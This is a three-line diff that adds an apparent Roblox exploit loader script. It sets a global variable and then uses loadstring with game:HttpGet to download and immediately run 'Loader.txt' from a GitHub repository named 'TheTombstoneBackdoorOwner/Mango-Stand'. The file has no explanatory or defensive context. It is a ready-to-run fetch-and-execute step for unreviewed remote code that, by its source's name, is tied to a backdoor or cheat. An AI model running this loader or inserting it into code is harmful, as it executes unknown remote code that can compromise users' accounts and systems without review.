@@ -1,0 +1,3 @@
+getgenv().Cooldude = ""
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mango-Stand/refs/heads/main/Loader.txt"))()
